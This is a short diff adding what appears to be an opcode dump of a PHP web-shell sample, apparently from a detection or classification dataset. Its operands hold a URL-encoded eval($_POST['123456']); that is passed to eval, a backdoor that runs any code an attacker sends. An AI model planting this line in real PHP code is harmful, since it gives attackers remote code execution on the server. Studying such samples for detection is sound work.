@@ -1,0 +1,9 @@
+|filename:|/root/samples/xorshellpost-pro.php
+|functionname:|(null)
+|numberofops:|3
+|compiledvars:|!0=$xor
+|line|#*|||op|fetch|ext|return|operands
+|2|0|E>|ASSIGN||||!0|,|'eval%28%24_POST%5B%27123456%27%5D%29%3B'|
+|3|1||INCLUDE_OR_EVAL||||!0|,|EVAL|
+|4|2|>|RETURN||||1|
+|
